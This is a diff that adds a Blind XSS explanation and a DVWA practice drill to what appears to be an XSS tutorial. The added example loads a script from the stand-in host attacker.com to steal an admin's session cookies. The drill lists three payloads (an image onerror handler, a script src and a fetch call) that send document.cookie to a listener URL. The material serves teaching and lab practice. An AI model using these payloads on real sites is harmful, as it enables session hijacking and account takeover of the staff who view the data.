@@ -110,6 +110,37 @@ A DOM Based XSS attack against this page can be accomplished by sending the foll
 
 `https://example.com/page.html?default=<script>alert(1)</script>`
 
+### Blind XSS
+Blind XSS is a subtype of stored XSS that occurs when the application stores the attacker's payload, but executes it in a context or interface that the attacker cannot directly access or observe (e.g., admin panels, internal support ticketing systems, feedback review portals, log viewers, or contact forms reviewed by backend staff).
+
+1. The attacker submits a malicious script payload through a public input field (such as a feedback form, contact form, or User-Agent header).
+2. The web application saves the input in a database or log file without proper sanitization.
+3. An internal administrator or staff member logs into a private dashboard or admin panel to review these submissions.
+4. The staff member's browser retrieves the stored payload and executes it within their administrative session.
+5. The executed script performs actions or exfiltrates data (like session cookies or screenshots) to a server controlled by the attacker.
+
+It is called **blind** because the attacker receives no immediate visual feedback or response from the application indicating the vulnerability exists. Because the payload executes on a completely separate, private interface, standard reflected or stored XSS detection methods will fail to show any results.
+
+To discover Blind XSS vulnerabilities, attackers and security researchers inject payloads designed to trigger an out-of-band (OOB) callback to an external, attacker-controlled server (e.g., via toolkits like XSS Hunter Express, command-line webhooks, or public request bins) and wait for the server to be contacted when a victim triggers the execution.
+
+#### Example
+Consider a web application with a "Contact Us" form where visitors can submit feedback.
+An attacker fills out the form and includes a script payload:
+`<script src="https://attacker.com/xss.js"></script>`
+
+The form submission returns a generic success message, and the attacker sees no change on the public site. However, the message is stored in the database. Later, a customer support agent logs into an internal, private admin panel to view the feedback. The dashboard renders the message:
+```html
+<div class="feedback-message">
+  <script src="https://attacker.com/xss.js"></script>
+</div>
+```
+The support agent's browser executes the script, loading `xss.js` from the attacker's server, which then steals the agent's session cookies and sends them back to the attacker.
+
+#### Further reading
+* [PortSwigger's Blind XSS material](https://portswigger.net/web-security/cross-site-scripting/blind)
+* [PayloadsAllTheThings XSS Injection README (Blind XSS section)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
+* [mandatoryprogrammer/xsshunter-express on GitHub](https://github.com/mandatoryprogrammer/xsshunter-express)
+
 
 ## Note
 The three types of XSS presented above are the ones that historically speaking were categorised, but in order to do a categorization a criteria is needed. The types above have no criteria on which they are sepparated, so let's split XSS vulnerabilities by the place where data is used:
@@ -169,6 +200,44 @@ https://xss-quiz.int21h.jp/
 http://sudo.co.il/xss/
 
 Those should be enough to suck the soul out of you.
+
+### 5. Blind XSS Drill
+In this drill, you will simulate a real-world Blind XSS attack by setting up a listener and submitting a payload to a "Contact Us" or guestbook-style form.
+
+#### Step 1: Set up a listener
+Because you will not see the output of your payload directly, you must configure a listener to receive an out-of-band callback. You can do this in one of two ways:
+* **Option A: Public Request Bin (Recommended)**
+  Go to a free service like [Webhook.site](https://webhook.site/) or [RequestBin](https://public.requestbin.com/) and copy your unique endpoint URL (e.g., `https://webhook.site/your-unique-id`).
+* **Option B: Local HTTP Server**
+  Start a local HTTP server on your machine using Python (note: the vulnerable application must be able to reach your machine's IP):
+  ```bash
+  $ python3 -m http.server 8000
+  ```
+  Your listener URL will be `http://YOUR_LOCAL_IP:8000/`.
+
+#### Step 2: Submit the Blind XSS Payload
+Using DVWA's **XSS (Stored)** module (or a similar form on a local application), we will simulate a "Contact Us" feedback form that is reviewed by administrators.
+
+Craft a payload that forces the browser of anyone who views it to send an HTTP request to your listener. Replace `YOUR_LISTENER_URL` with your actual webhook or local server URL:
+* **Using an image tag callback:**
+  ```html
+  <img src="YOUR_LISTENER_URL/log?cookie=" onerror="this.src+=document.cookie" />
+  ```
+* **Using a script tag callback:**
+  ```html
+  <script src="YOUR_LISTENER_URL/xss.js"></script>
+  ```
+* **Using the Fetch API callback:**
+  ```html
+  <script>fetch('YOUR_LISTENER_URL/exfil?c=' + btoa(document.cookie))</script>
+  ```
+
+Submit your crafted payload into the "Message" or input field of the form.
+
+#### Step 3: Verify the Callback
+To simulate an administrator viewing the "Contact Us" or feedback logs, reload the guestbook page. This mimics the admin opening the panel.
+
+Check your listener's dashboard (on Webhook.site) or look at your terminal output (if using Python's HTTP server). You should see an incoming HTTP request. Analyze the headers and query parameters to verify that the request was triggered by your payload and successfully sent the cookies or metadata back to your listener.
 
 ## Further reading
 * https://owasp.org/www-community/attacks/xss/
